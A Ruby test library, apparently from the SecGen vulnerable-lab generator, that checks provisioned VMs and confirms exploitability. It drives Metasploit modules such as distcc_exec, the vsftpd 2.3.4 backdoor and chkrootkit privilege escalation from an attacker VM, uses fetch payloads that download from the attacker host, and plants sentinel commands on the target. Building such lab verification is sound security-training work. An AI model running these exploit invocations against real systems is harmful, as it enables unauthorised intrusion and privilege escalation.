# Post Provision Testing
#
# This file will be copied into each project folder at creation time.
# It will be required from each of the modules/secgen_tests/module_name.rb test scripts
#
# Test classes must: require_relative '../../../../../lib/post_provision_test'
#
# Results (see README-Testing.md, "Results contract"):
# - every check is PASS / FAIL / SKIP with a tier (1 provisioned, 2 service/tool
#   works, 3 exploitable);
# - run writes projects/<id>/test_results/<system>/<module>.json, collects
#   evidence into evidence/<module>/ on FAIL, prints the PASSED:/FAILED:/SKIPPED:
#   lines and exits 0 (PASS), 1 (FAIL) or 2 (SKIP: could not test).
# Legacy tests that push "PASSED: ..." / "FAILED: ..." onto outputs and set
# all_tests_passed keep working: those lines are recorded as checks.

require 'json'
require 'base64'
require 'socket'
require 'timeout'
require 'net/http'
require 'open3'
require 'shellwords'
require 'fileutils'
require 'time'
require 'rexml/document'

# Proxmox transport (QEMU Guest Agent). Optional: only used when the project was
# built against Proxmox (a test_context.json sits in the project root and
# .vagrant/machines/<system>/proxmox/id exists). Copied into the project lib
# alongside this file at build time.
begin
  require_relative './proxmox_connection'
rescue LoadError
  # Vagrant-only projects don't ship the proxmox client; that's fine.
end

class PostProvisionTest
  STATUSES = %w[PASS FAIL SKIP].freeze
  EXIT_CODES = { 'PASS' => 0, 'FAIL' => 1, 'SKIP' => 2 }.freeze
  LINE_PREFIXES = { 'PASS' => 'PASSED', 'FAIL' => 'FAILED', 'SKIP' => 'SKIPPED' }.freeze
  TIERS = { 1 => 'provisioned', 2 => 'service/tool works', 3 => 'exploitable' }.freeze

  # Raised to stop the test when it cannot go on (no IP, no guest agent, no
  # credentials). Recorded as a SKIP check: a harness problem, never a pass.
  class SkipTest < StandardError; end

  # outputs is still an array of lines, but legacy "PASSED: ..." / "FAILED: ..."
  # lines pushed with << are also recorded as checks.
  class Outputs < Array
    def initialize(test)
      super()
      @test = test
    end

    def <<(line)
      super
      @test.send(:record_legacy_line, line)
      self
    end
  end

  attr_accessor :project_path
  attr_writer :system_ip
  attr_accessor :module_name
  attr_accessor :module_path
  attr_accessor :json_inputs
  attr_accessor :port
  attr_accessor :outputs
  attr_accessor :all_tests_passed
  attr_reader :results

  def initialize
    self.outputs = Outputs.new(self)
    @results = []
    @current_tier = nil # set by #tier; nil = each helper's own default
    @extra_evidence = {}
    self.json_inputs = get_json_inputs
    self.port = get_port
    self.all_tests_passed = true
  end

  def run
    @started_at = Time.now
    begin
      wait_for_guest_agent if proxmox?
      test_module
    rescue SkipTest => e
      record('test could not continue', 'SKIP', e.message)
    rescue StandardError, ScriptError => e
      record("test raised #{e.class}", 'SKIP', "#{e.message} (#{(e.backtrace || []).first(3).join(' | ')})")
    end

    # A legacy test may clear all_tests_passed without a FAILED: line.
    if !all_tests_passed && @results.none? { |r| r[:status] == 'FAIL' }
      record('test reported failure', 'FAIL', 'all_tests_passed was set to false')
    end
    record('no checks were run', 'SKIP') if @results.empty?

    status = overall_status
    collect_evidence if status == 'FAIL'
    write_results(status)

    puts self.outputs
    exit(EXIT_CODES[status])
  end

  def test_module
    # Call super first in overriden methods
    self.outputs.push "Running tests for #{self.module_name}"
  end

  #####################
  # Results           #
  #####################

  # Record one check. status is PASS / FAIL / SKIP; tier defaults to the current
  # tier (see #tier). evidence (text) is saved under evidence/<module>/.
  def record(name, status, detail = nil, tier: nil, evidence: nil)
    status = status.to_s.upcase
    raise ArgumentError, "unknown status #{status}" unless STATUSES.include?(status)
    tier ||= @current_tier || 1
    check = { tier: tier, name: name.to_s, status: status, detail: detail }
    check[:evidence] = [save_evidence("check_#{@results.size + 1}", evidence)].compact if evidence
    @results << check
    self.all_tests_passed = false if status == 'FAIL'
    self.outputs.push "#{LINE_PREFIXES[status]}: #{detail.nil? || detail.to_s.empty? ? name : detail}"
    check
  end

  def pass_check(name, detail = nil, **opts)
    record(name, 'PASS', detail, **opts)
  end

  def fail_check(name, detail = nil, **opts)
    record(name, 'FAIL', detail, **opts)
  end

  def skip_check(name, detail = nil, **opts)
    record(name, 'SKIP', detail, **opts)
  end

  # Stop the test now and report SKIP (e.g. a prerequisite isn't available).
  def skip!(reason)
    raise SkipTest, reason
  end

  # Set the tier for the checks that follow, or (with a block) for the checks
  # inside it: 1 provisioned, 2 service/tool works, 3 exploitable.
  #   tier(3) { test_banner('vsFTPd 2.3.4') }
  def tier(level)
    raise ArgumentError, "tier must be one of #{TIERS.keys}" unless TIERS.key?(level)
    return @current_tier = level unless block_given?
    previous = @current_tier
    @current_tier = level
    begin
      yield
    ensure
      @current_tier = previous
    end
  end

  # tier: given explicitly, else the enclosing #tier, else the helper's default.
  def default_tier(tier, fallback)
    tier || @current_tier || fallback
  end

  # PASS if every check passed, FAIL if any failed, otherwise SKIP.
  def overall_status
    return 'FAIL' if @results.any? { |r| r[:status] == 'FAIL' }
    return 'SKIP' if @results.empty? || @results.any? { |r| r[:status] == 'SKIP' }
    'PASS'
  end

  # Highest tier whose checks (and every lower tier's) all passed; tiers with no
  # checks don't block a higher one. 0 if none.
  def tier_reached
    reached = 0
    TIERS.keys.each do |level|
      checks = @results.select { |r| r[:tier] == level }
      next if checks.empty?
      break unless checks.all? { |r| r[:status] == 'PASS' }
      reached = level
    end
    reached
  end

  # Add a guest command whose output is saved as evidence if the test FAILs.
  def add_evidence(name, command)
    @extra_evidence[name.to_s] = command
  end

  #####################
  # Testing Functions #
  #####################

  # Test service is up (tcp)
  def test_service_up(port: self.port, tier: nil)
    tier = default_tier(tier, 2)
    if port.nil? || port.to_i <= 0
      return skip_check("service up", "No port to test for #{self.module_name} (no 'port' input)", tier: tier)
    end
    port_open = proxmox? ? guest_port_listening?(port) : is_port_open?(system_ip, port)
    if port_open
      pass_check("port #{port} open", "Port #{port} is open at #{ip_label} (#{get_system_name})!", tier: tier)
    else
      fail_check("port #{port} open", "Port #{port} is closed at #{ip_label} (#{get_system_name})!", tier: tier)
    end
  end

  # example usage for page: /index.html
  # On Proxmox the page is fetched from inside the guest (the host can't reach
  # the scenario VLAN).
  def test_html_returned_content(page, match_string, hide_content = false, port: self.port, tier: nil)
    tier = default_tier(tier, 2)
    response = http_get(page, port: port)
    shown = hide_content ? '<redacted>' : match_string
    name = "#{page} contains #{shown}"
    if response[:error]
      fail_check(name, "Content #{shown} is not contained within #{page} at #{ip_label}:#{port} (#{get_system_name})! (#{response[:error]})", tier: tier)
    elsif response[:body].include?(match_string)
      pass_check(name, "Content #{shown} is contained within #{page} at #{ip_label}:#{port} (#{get_system_name})!", tier: tier)
    else
      fail_check(name, "Content #{shown} is not contained within #{page} at #{ip_label}:#{port} (#{get_system_name})! (HTTP #{response[:status]})", tier: tier)
    end
  end

  # HTTP check: passes if the response status matches (default 2xx/3xx) and,
  # if given, the body contains match.
  def test_http(path, match: nil, status: nil, port: self.port, scheme: 'http', label: nil, tier: nil)
    tier = default_tier(tier, 2)
    response = http_get(path, port: port, scheme: scheme)
    name = label || "HTTP #{scheme}://:#{port}#{path}"
    return fail_check(name, "#{name}: empty match string, so the check would always pass", tier: tier) if match == ''
    if response[:error]
      return fail_check(name, "#{name}: #{response[:error]}", tier: tier)
    end
    status_ok = status ? response[:status].to_i == status.to_i : (200..399).cover?(response[:status].to_i)
    body_ok = match.nil? || response[:body].include?(match)
    detail = "#{name}: HTTP #{response[:status]}#{match ? ", body #{body_ok ? 'contains' : 'does not contain'} #{match.inspect}" : ''}"
    status_ok && body_ok ? pass_check(name, detail, tier: tier) : fail_check(name, detail, tier: tier)
  end

  # Banner check: connects to the port (from inside the guest on Proxmox),
  # optionally sends a line, and passes if what comes back contains match.
  def test_banner(match, port: self.port, send: nil, label: nil, tier: nil)
    tier = default_tier(tier, 2)
    name = label || "banner on port #{port} contains #{match.inspect}"
    return fail_check(name, "#{name}: empty match string, so the check would always pass", tier: tier) if match.to_s.empty?
    banner = read_banner(port, send: send)
    if banner.include?(match)
      pass_check(name, "Port #{port} banner contains #{match.inspect} (#{get_system_name})", tier: tier)
    else
      fail_check(name, "Port #{port} banner does not contain #{match.inspect} (#{get_system_name}); got #{banner[0, 200].inspect}", tier: tier)
    end
  end

  # Passes if match_string appears in the command's stdout. user: runs it as
  # that account (see #run_as_user) instead of root. With 2>&1 a missing
  # program's "x: command not found" lands in stdout, so never match on the
  # program's own name there; use test_command_succeeds for "x runs".
  def test_local_command(test_output, local_command, match_string, user: nil, tier: nil)
    tier = default_tier(tier, 1)
    as = user ? " as #{user}" : ''
    name = "#{test_output} local command (#{local_command})#{as} matches with output (#{match_string})"
    return fail_check(name, "#{name}: empty match string, so the check would always pass", tier: tier) if match_string.to_s.empty?
    output = user ? run_as_user(user, local_command) : run_vagrant_ssh(local_command)
    if output[:stdout].include?(match_string)
      pass_check(name, "#{name} on #{get_system_name}!", tier: tier)
    else
      fail_check(name, "#{name} on #{get_system_name}!", tier: tier,
           evidence: "$ #{local_command}#{as}\n--- stdout\n#{output[:stdout]}\n--- stderr\n#{output[:stderr]}")
      self.outputs.push output[:stderr]
    end
  end

  # Passes if the command exits 0 (e.g. a tool runs from a login shell).
  def test_command_succeeds(label, command, user: nil, tier: nil)
    tier = default_tier(tier, 2)
    output = user ? run_as_user(user, command) : run_vagrant_ssh(command)
    as = user ? " as #{user}" : ''
    name = "#{label} (#{command})#{as}"
    if output[:exit_status] == 0
      pass_check(name, "#{name} exited 0 on #{get_system_name}", tier: tier)
    else
      fail_check(name, "#{name} exited #{output[:exit_status]} on #{get_system_name}", tier: tier,
           evidence: "$ #{command}#{as}\n--- stdout\n#{output[:stdout]}\n--- stderr\n#{output[:stderr]}")
    end
  end

  # Pass iff the file at `path` exists and its contents contain `match_string`.
  # Guards existence first, so a missing file fails clearly rather than matching
  # empty output. Returns the recorded check.
  def test_file_contains(path, match_string, user: nil, label: nil, tier: nil)
    escaped = Shellwords.escape(path)
    test_local_command(label || "#{path} contains #{match_string.inspect}",
                       "test -f #{escaped} && cat #{escaped}", match_string, user: user, tier: tier)
  end

  # Assert that leaked strings appear in their files. `strings` and `paths` each
  # accept a single value or an array:
  #   test_leaked_strings('flag{…}', '/root/flag.txt')
  #   test_leaked_strings(%w[a b], ['/root/f1', '/root/f2'])
  # Strings pair with paths by index; any strings beyond the last path are
  # expected in the first path (matching leak_files, which appends overflow
  # strings to the first file). Returns true iff every string was found; skips
  # (and returns false) when either list is empty.
  def test_leaked_strings(strings, paths, user: nil, tier: nil, label: nil)
    strings = Array(strings).map(&:to_s).reject(&:empty?)
    paths   = Array(paths).map(&:to_s).reject(&:empty?)
    if strings.empty? || paths.empty?
      skip_check(label || 'leaked strings', 'no strings or paths supplied', tier: tier)
      return false
    end
    strings.each_with_index.map do |string, i|
      path = paths[i] || paths.first
      name = "#{label ? "#{label}: " : ''}leaked string #{string.inspect} present in #{path}"
      test_file_contains(path, string, user: user, label: name, tier: tier)[:status] == 'PASS'
    end.all?
  end

  # Assert a file is writable, by root and/or by an unprivileged user. At least
  # one of by_root / by_low_privilege must be set; both runs both. The low-priv
  # check runs as `user` (an existing unprivileged account, default nobody).
  # The write is an empty append (`: >> file`), which needs write permission but
  # changes nothing, so the system is not taken to root.
  def test_file_writable(path, by_root: false, by_low_privilege: false, user: 'nobody', tier: nil)
    raise ArgumentError, 'test_file_writable needs by_root and/or by_low_privilege' unless by_root || by_low_privilege
    escaped = Shellwords.escape(path)
    probe = ": >> #{escaped} || { ls -l #{escaped} >&2; id >&2; exit 1; }"
    test_command_succeeds("#{path} is writable by root", probe, tier: tier) if by_root
    test_command_succeeds("#{path} is writable by #{user} (unprivileged)", probe, user: user, tier: tier) if by_low_privilege
  end

  ##################
  # Misc Functions #
  ##################

  # Run a shell command on the system (as root on Proxmox, as the vagrant user
  # over vagrant ssh). Returns {stdout:, stderr:, exit_status:}.
  # 90 s by default: a busy Proxmox host (ten builds at once) made quick checks such
  # as `python3 -m pip --version` miss 30 s and SKIP. Checks that need longer pass
  # their own timeout.
  def run_vagrant_ssh(args, timeout: 90)
    # On Proxmox, run the command in the guest via the QEMU Guest Agent instead
    # of vagrant ssh (no guest network path is needed, and it survives net0
    # teardown). This is just run_on_system targeting ourselves.
    return run_on_system(get_system_name, args, timeout: timeout) if proxmox?
    # argv form: no local shell, so quotes in args reach the guest intact.
    vagrant = File.executable?('/usr/bin/vagrant') ? '/usr/bin/vagrant' : 'vagrant'
    vagrant_ssh = -> { Open3.capture3(vagrant, 'ssh', get_system_name, '-c', args, chdir: get_project_path) }
    # tests run under `bundle exec`; Vagrant (with its own embedded Ruby) must not inherit that
    # environment, or it tries to load SecGen's bundle and fails before connecting
    stdout, stderr, status = if defined?(Bundler) && Bundler.respond_to?(:with_unbundled_env)
                               Bundler.with_unbundled_env(&vagrant_ssh)
                             else
                               vagrant_ssh.call
                             end
    {:stdout => stdout, :stderr => stderr, :exit_status => status.exitstatus}
  end
  alias run_command run_vagrant_ssh

  # --- Cross-system helpers (tier 3 / Phase 1C) ---------------------------
  # Network-side and exploit tests run from *another* system in the project
  # (e.g. a Kali attacker VM) and target the system under test by its IP.
  # On Proxmox each sibling system is reached over its own QEMU Guest Agent,
  # resolved from .vagrant/machines/<name>/proxmox/id, so no guest network
  # path to the host is needed. Only supported on Proxmox.

  # Does a sibling system by this name exist in the project?
  def system_present?(name)
    return File.exist?(other_proxmox_id_path(name)) if proxmox?
    File.directory?("#{get_project_path}/.vagrant/machines/#{name}")
  end

  # Is another module (by its directory name in the project, e.g.
  # 'security_shepherd') installed on this same system? For a test whose
  # assumption another module legitimately changes: check something that still
  # holds, and leave the changed part to that module's own test. Don't SKIP for
  # it: any SKIP makes the whole module SKIP.
  def module_on_system?(name)
    File.directory?(File.join(get_system_path, 'modules', name))
  end

  def other_proxmox_id_path(name)
    "#{get_project_path}/.vagrant/machines/#{name}/proxmox/id"
  end

  # [node, vmid] for a sibling system from its Vagrant-written id file.
  def other_proxmox_node_vmid(name)
    File.read(other_proxmox_id_path(name)).strip.split('/')
  end

  # Run a shell command on another system in the project. Returns
  # {stdout:, stderr:, exit_status:}. Proxmox only (guest agent on that VM).
  def run_on_system(name, args, timeout: 60)
    unless proxmox?
      return {:stdout => '', :stderr => "run_on_system is Proxmox-only (#{name})", :exit_status => 127}
    end
    node, vmid = other_proxmox_node_vmid(name)
    # Send the command base64-encoded and decode it in the guest. The QEMU guest
    # agent on buster (3.1) strips every '%' from the argv it is given, which broke
    # any check with a format string there (curl -w '%{http_code}', stat -c '%U',
    # printf, date) with false FAILs. Base64 has no '%' and no shell metacharacters;
    # "$c" hands the decoded command to the same login shell as one argument.
    encoded = Base64.strict_encode64(args.to_s)
    wrapped = "c=$(echo #{encoded} | base64 -d) && exec bash -lc \"$c\""
    result = proxmox_connection.exec_qemu_guest(vmid, node, ['bash', '-c', wrapped], timeout: timeout)
    # The agent reports a signal and no exitcode for a killed process (e.g. a segfault).
    exit_status = result[:exitcode] || (result[:signal] && 128 + result[:signal].to_i)
    {:stdout => result[:stdout], :stderr => result[:stderr], :exit_status => exit_status}
  end

  # The IP of a sibling system (first non-loopback IPv4 from its guest agent).
  def other_system_ip(name)
    return nil unless proxmox?
    node, vmid = other_proxmox_node_vmid(name)
    proxmox_connection.qemu_agent_get_ip(vmid, node)
  end

  # The SecGen checkout root (the project lives at <root>/projects/<id>).
  # The SecGen checkout root (the project lives at <root>/projects/<id>, see
  # Per-system facts the build recorded in test_context.json (no secrets):
  # [{'name', 'base', 'base_types'}, ...]. Written by project_files_creator at
  # build time, so a secgen_test never has to read module metadata out of the
  # SecGen checkout.
  def context_systems
    (test_context && test_context['systems']) || []
  end

  # Name of the sibling system acting as the attacker: the first *other* system
  # whose base declares <type>attack</type> (e.g. a Kali base). nil if there
  # isn't one, so callers SKIP cleanly on a single-VM run. Override by passing
  # an explicit name to the exploit helpers.
  def attack_system
    return @attack_system if defined?(@attack_system)
    @attack_system = context_systems
                     .reject { |s| s['name'] == get_system_name }
                     .find { |s| Array(s['base_types']).include?('attack') }
                     &.dig('name')
  end

  # --- Proof-of-RCE sentinel (shared by the exploit helpers) --------------
  # A sentinel is a world-readable file the exploit leaves *on the target*; a
  # command that ran as some user writes `id` (and the hostname, plus any
  # `collect:` output) into it, and we read it back over the target's own guest
  # agent. A fresh nonce per call means an old file can't produce a false pass.
  # Returns [sentinel_path, command_string].
  #
  # `dir` is the directory the sentinel is written in (default /tmp). Override it
  # when the exploited process runs under a systemd unit with `PrivateTmp=true`
  # (Debian's apache2.service, among others): the service then has its own
  # private /tmp and /var/tmp namespace, so a sentinel it drops in /tmp is
  # invisible to the root guest-agent read that verifies it, and the check would
  # FAIL even though the command ran. `PrivateTmp` isolates only /tmp and
  # /var/tmp, so a shared location such as /dev/shm (world-writable, 1777) is seen
  # identically by the service and by the verifying read.
  def build_sentinel(collect = nil, dir: '/tmp')
    nonce = "#{Time.now.to_i}_#{rand(100000)}"
    sentinel = "#{dir}/secgen_pwned_#{nonce}"
    cmd = "id > #{sentinel}; uname -n >> #{sentinel}; "
    cmd += "{ #{collect}; } >> #{sentinel} 2>/dev/null; " if collect
    cmd += "chmod 644 #{sentinel}"
    [sentinel, cmd]
  end

  # Read a sentinel back over the target's own guest agent. Returns its body
  # (empty string if absent), and files it as evidence when present.
  def read_sentinel(sentinel)
    body = run_vagrant_ssh("cat #{sentinel} 2>/dev/null", timeout: 30)[:stdout].to_s
    add_evidence('sentinel_on_target', "echo #{Shellwords.escape(body)}") unless body.empty?
    body
  end

  # True when a sentinel body proves a command ran on the target.
  def sentinel_pwned?(body)
    body =~ /uid=\d+/ ? true : false
  end

  # Poll the target for the sentinel for up to `timeout` seconds, returning as
  # soon as it proves RCE. Deferred-execution exploits (cron, at, a CMS task
  # scheduler, etc.) land the command some time after Metasploit exits,
  # so a single immediate read would miss them. Evidence is recorded once.
  def wait_for_sentinel(sentinel, timeout)
    deadline = Time.now + timeout
    body = ''
    loop do
      body = run_vagrant_ssh("cat #{sentinel} 2>/dev/null", timeout: 30)[:stdout].to_s
      break if sentinel_pwned?(body) || Time.now >= deadline
      sleep 5
    end
    add_evidence('sentinel_on_target', "echo #{Shellwords.escape(body)}") unless body.empty?
    body
  end

  # Resolve [attacker_name, attacker_ip, rhost] for an attacker-VM exploit, or
  # record a tier-`tier` SKIP under `name` and return nil (so the caller can
  # `return` cleanly). Proxmox-only; needs a sibling base type='attack'.
  def resolve_attacker(name, attacker, rhost, tier)
    unless proxmox?
      skip_check(name, 'attacker-VM exploit tests run only on the Proxmox pipeline', tier: tier)
      return nil
    end
    attacker ||= attack_system
    unless attacker && system_present?(attacker)
      skip_check(name, "No attacker (base type='attack') system in this project; exploit skipped", tier: tier)
      return nil
    end
    rhost ||= system_ip                 # may SKIP if the target IP can't be resolved
    attacker_ip = other_system_ip(attacker)
    if rhost.nil? || attacker_ip.nil?
      skip_check(name, "Could not resolve target (#{rhost.inspect}) or attacker (#{attacker_ip.inspect}) IP", tier: tier)
      return nil
    end
    [attacker, attacker_ip, rhost]
  end

  # --- Run any MSF module on the attacker VM (tier 3) ---------------------
  # Drive a Metasploit module (auxiliary, scanner, gather — anything that is
  # not an RCE exploit needing a payload) on the attacker VM against this
  # system (the target). Unlike test_msf_exploit, this records no PASS/FAIL
  # itself — the caller decides what to assert on the output or on a
  # follow-up command.
  #
  # Returns a hash on success:
  #   { attacker:, attacker_ip:, rhost:, stdout:, stderr:, exit_status:,
  #     msf_output: }
  # or nil if the attacker could not be resolved (a SKIP is recorded).
  #
  # Typical use (symlink traversal, scanner, info-leak auxiliary):
  #   aux = run_msf_module('auxiliary/admin/smb/samba_symlink_traversal',
  #                        options: { 'SMBSHARE' => 'public' })
  #   next unless aux
  #   # now assert on aux[:msf_output] or run a follow-up command
  #
  #   aux = run_msf_module('auxiliary/gather/enum_dns',
  #                        options: { 'DOMAIN' => 'example.com' })
  def run_msf_module(msf_module, rhost: nil, attacker: nil, options: {},
                     tier: 3, label: nil,
                     timeout: (ENV['SECGEN_MSF_TIMEOUT'] || 120).to_i)
    name = label || "msf module (#{msf_module})"
    resolved = resolve_attacker(name, attacker, rhost, tier)
    return nil unless resolved
    attacker_name, attacker_ip, rhost = resolved

    settings = { 'RHOSTS' => rhost }
    settings.merge!(options.map { |k, v| [k.to_s, v] }.to_h)
    set_lines = settings.map { |k, v| "set #{k} #{msf_set_value(v)};" }.join(' ')

    msf = "export HOME=/root TERM=dumb; msfconsole -q -x \"use #{msf_module}; " \
          "#{set_lines} run; exit -y\""
    result = run_on_system(attacker_name, msf, timeout: timeout)
    msf_out = "#{result[:stdout]}\n#{result[:stderr]}"
    evidence_key = "msf_output_#{msf_module.split('/').last}"
    add_evidence(evidence_key, "echo #{Shellwords.escape(msf_out[-4000..-1] || msf_out)}")

    { attacker: attacker_name, attacker_ip: attacker_ip, rhost: rhost,
      stdout: result[:stdout], stderr: result[:stderr],
      exit_status: result[:exit_status], msf_output: msf_out }
  end

  # --- Metasploit exploit helper (tier 3) ---------------------------------
  # Drive a Metasploit exploit module from the attacker VM against this system
  # (the target under test) and record a tier-3 PASS/FAIL/SKIP.
  #
  # The payload is a no-session command payload, so the exploit runs our sentinel
  # command *on the target* and there is no reverse/bind shell to race:
  #   * default cmd/unix/generic — its CMD runs directly on the target (distcc);
  #   * a modern command-stager "fetch" payload such as cmd/linux/http/x64/exec
  #     (pass it as payload:) — its CMD also just runs on the target, but the
  #     stager first fetches a tiny runner over HTTP from the attacker, so the
  #     helper points FETCH_SRVHOST back at the attacker automatically.
  # Proof of RCE is a sentinel file the command leaves on the target, which the
  # target's own guest agent reads back and checks for `uid=`. collect: appends
  # extra shell (e.g. 'cat /home/distccd/*') captured into the sentinel as
  # evidence. force: sets ForceExploit, for modules whose automatic check is
  # inconclusive (e.g. the vsftpd 2.3.4 backdoor). options: adds/overrides msf
  # datastore settings (RHOSTS/RPORT/PAYLOAD/CMD, and FETCH_SRVHOST for a fetch
  # payload, are set for you; pass LHOST etc. here).
  #
  #   test_msf_exploit('exploit/unix/misc/distcc_exec',
  #                    rport: 3632, collect: 'cat /home/distccd/*')
  #   test_msf_exploit('exploit/unix/ftp/vsftpd_234_backdoor', rport: 21,
  #                    payload: 'cmd/linux/http/x64/exec', force: true)
  def test_msf_exploit(msf_module, rhost: nil, rport: self.port, attacker: nil,
                       payload: 'cmd/unix/generic', collect: nil, force: false,
                       options: {}, tier: 3, label: nil, expect_privilege: nil,
                       sentinel_wait: (ENV['SECGEN_SENTINEL_WAIT'] || 0).to_i,
                       sentinel_dir: '/tmp')
    name = label || "msf exploit (#{msf_module})"
    validate_expect_privilege!(expect_privilege)
    resolved = resolve_attacker(name, attacker, rhost, tier)
    return unless resolved
    attacker, attacker_ip, rhost = resolved

    # When asserting the shell's privilege level, also capture `sudo -n -l` in the
    # sentinel so a passwordless sudoer is told apart from a plain user (group
    # membership in sudo/admin/wheel is the primary signal; see privilege_matches?).
    if expect_privilege
      collect = [collect, 'echo secgen_sudo_begin; sudo -n -l 2>/dev/null; echo secgen_sudo_end'].compact.join('; ')
    end
    sentinel, cmd = build_sentinel(collect, dir: sentinel_dir)
    settings = { 'RHOSTS' => rhost, 'RPORT' => rport, 'PAYLOAD' => payload, 'CMD' => cmd }
    settings['ForceExploit'] = true if force
    # Command-stager "fetch" payloads (cmd/<os>/http/...) download a runner over
    # HTTP from the attacker; point them back at it unless the caller set it.
    if payload =~ %r{\Acmd/[^/]+/http/} && !(options.key?('FETCH_SRVHOST') || options.key?(:FETCH_SRVHOST))
      settings['FETCH_SRVHOST'] = attacker_ip
    end
    settings.merge!(options.map { |k, v| [k.to_s, v] }.to_h)
    set_lines = settings.map { |k, v| "set #{k} #{msf_set_value(v)};" }.join(' ')

    # HOME must be exported: the guest agent runs commands with no HOME, and
    # msfconsole's rb-readline aborts on startup without it.
    msf = "export HOME=/root TERM=dumb; msfconsole -q -x \"use #{msf_module}; " \
          "#{set_lines} run; sleep 8; exit -y\""
    result = run_on_system(attacker, msf, timeout: (ENV['SECGEN_MSF_TIMEOUT'] || 600).to_i)
    msf_out = "#{result[:stdout]}\n#{result[:stderr]}"
    add_evidence('msf_output', "echo #{Shellwords.escape(msf_out[-4000..-1] || msf_out)}")

    body = sentinel_wait > 0 ? wait_for_sentinel(sentinel, sentinel_wait) : read_sentinel(sentinel)
    record_rce_outcome(name, body, sentinel,
                       "RCE confirmed: #{msf_module} from #{attacker} (#{attacker_ip}) ran a command on the target (#{rhost})",
                       expect_privilege, tier)
  end

  # --- Metasploit LOCAL exploit helper (tier 3) ---------------------------
  # Drive a Metasploit *local* privilege-escalation exploit from the attacker VM.
  # A local exploit (Msf::Exploit::Local) runs against an existing SESSION on the
  # target, not an RHOSTS call — so there is nothing for test_msf_exploit to aim
  # at. This helper first opens a low-privilege shell on the target with
  # auxiliary/scanner/ssh/ssh_login (becomes session 1) using session_user /
  # session_pass, then `use <msf_module>; set SESSION 1` and runs it.
  #
  # Proof is the same sentinel as the remote helper: the payload's CMD
  # (cmd/unix/generic by default — runs on the target, no reverse/bind shell to
  # race) writes `id` into a file the target's own guest agent reads back. For a
  # deferred trigger (chkrootkit fires when root's cron next runs it, not when
  # the exploit returns) pass sentinel_wait long enough for the next tick;
  # expect_privilege: :root asserts the sentinel shows a root shell.
  #
  # The caller supplies the foothold credentials and is responsible for the
  # account's lifecycle — see with_throwaway_ssh_user, which creates a disposable
  # one on the target and removes it again, so the vulnerable image ships without
  # an extra login.
  #
  #   with_throwaway_ssh_user do |user, pass|
  #     test_msf_local_exploit('exploit/unix/local/chkrootkit',
  #                            session_user: user, session_pass: pass,
  #                            options: { 'CHKROOTKIT' => '/usr/sbin/chkrootkit',
  #                                       'AllowNoCleanup' => true },
  #                            expect_privilege: :root, sentinel_wait: 180)
  #   end
  def test_msf_local_exploit(msf_module, session_user:, session_pass:,
                             ssh_port: 22, attacker: nil, rhost: nil,
                             payload: 'cmd/unix/generic', collect: nil,
                             force: false, options: {}, tier: 3, label: nil,
                             expect_privilege: :root,
                             sentinel_wait: (ENV['SECGEN_SENTINEL_WAIT'] || 180).to_i,
                             sentinel_dir: '/tmp')
    name = label || "msf local exploit (#{msf_module})"
    validate_expect_privilege!(expect_privilege)
    # A sudoer foothold proves nothing about escalation: root here means uid 0.
    expect_privilege = :uid0 if expect_privilege.to_s.start_with?('root')
    resolved = resolve_attacker(name, attacker, rhost, tier)
    return unless resolved
    attacker, attacker_ip, rhost = resolved

    # Capture sudo -n -l alongside id so privilege_matches? can tell a root shell
    # (or a sudoer) from a plain user, exactly as test_msf_exploit does.
    if expect_privilege
      collect = [collect, 'echo secgen_sudo_begin; sudo -n -l 2>/dev/null; echo secgen_sudo_end'].compact.join('; ')
    end
    sentinel, cmd = build_sentinel(collect, dir: sentinel_dir)

    login = { 'RHOSTS' => rhost, 'RPORT' => ssh_port, 'USERNAME' => session_user,
              'PASSWORD' => session_pass, 'CreateSession' => true,
              'BLANK_PASSWORDS' => false, 'ANONYMOUS_LOGIN' => false,
              'STOP_ON_SUCCESS' => true }
    exp = { 'SESSION' => 1, 'PAYLOAD' => payload, 'CMD' => cmd }
    exp['ForceExploit'] = true if force
    exp.merge!(options.map { |k, v| [k.to_s, v] }.to_h)

    login_lines = login.map { |k, v| "set #{k} #{msf_set_value(v)};" }.join(' ')
    exp_lines   = exp.map   { |k, v| "set #{k} #{msf_set_value(v)};" }.join(' ')

    # HOME must be exported (see test_msf_exploit). One msfconsole run:
    #   1. ssh_login opens the low-priv shell (session 1); `sessions -l` records
    #      whether it actually opened, for the evidence on failure.
    #   2. the local exploit plants its payload (here, chkrootkit's /tmp/update)
    #      against that session. It is launched as a background job (exploit -j -z)
    #      so msfconsole does NOT block on the module's own cron/handler wait — a
    #      no-session cmd payload would make `run` hang until the guest-agent
    #      timeout and return nothing. We sleep only long enough for the job to
    #      write the payload, then exit; the deferred root-cron execution is
    #      caught by our own wait_for_sentinel on the target.
    plant_wait = (ENV['SECGEN_MSF_PLANT_WAIT'] || 30).to_i
    msf = "export HOME=/root TERM=dumb; msfconsole -q -x " \
          "\"use auxiliary/scanner/ssh/ssh_login; #{login_lines} run; sessions -l; " \
          "use #{msf_module}; #{exp_lines} exploit -j -z; sleep #{plant_wait}; " \
          "sessions -l; jobs; exit -y\""
    result = run_on_system(attacker, msf, timeout: (ENV['SECGEN_MSF_TIMEOUT'] || 600).to_i)
    msf_out = "#{result[:stdout]}\n#{result[:stderr]}"
    add_evidence('msf_output', "echo #{Shellwords.escape(msf_out[-6000..-1] || msf_out)}")

    body = sentinel_wait > 0 ? wait_for_sentinel(sentinel, sentinel_wait) : read_sentinel(sentinel)
    record_rce_outcome(name, body, sentinel,
                       "Privilege escalation confirmed: #{msf_module} via a #{session_user} SSH session from #{attacker} (#{attacker_ip}) ran a command on the target (#{rhost})",
                       expect_privilege, tier)
  end

  # Shared PASS/FAIL recording once a sentinel has been read back for an exploit
  # helper. PASS when it proves RCE (uid=) and, if expect_privilege is given, the
  # shell's privilege matches the module's <privilege>; FAIL otherwise.
  # success_prefix is the leading clause of the PASS detail (what ran, from where,
  # against what); the sentinel/uid/privilege suffix is appended here.
  def record_rce_outcome(name, body, sentinel, success_prefix, expect_privilege, tier)
    unless sentinel_pwned?(body)
      return fail_check(name,
                        "Exploit did not confirm RCE: sentinel #{sentinel} absent or empty on the target. See msf_output evidence.",
                        tier: tier)
    end
    if expect_privilege && !privilege_matches?(body, expect_privilege)
      fail_check(name,
                 "RCE confirmed, but the shell's privilege does not match the module's <privilege>=#{expect_privilege}: sentinel shows #{body[/uid=\S+/]}#{privilege_note(body)}. Expected #{{ 'uid0' => 'a root shell (uid=0)' }.fetch(expect_privilege.to_s) { expect_privilege.to_s =~ /user/ ? 'a non-root, non-sudoer shell' : 'a root or sudoer shell' }}.",
                 tier: tier)
    else
      pass_check(name,
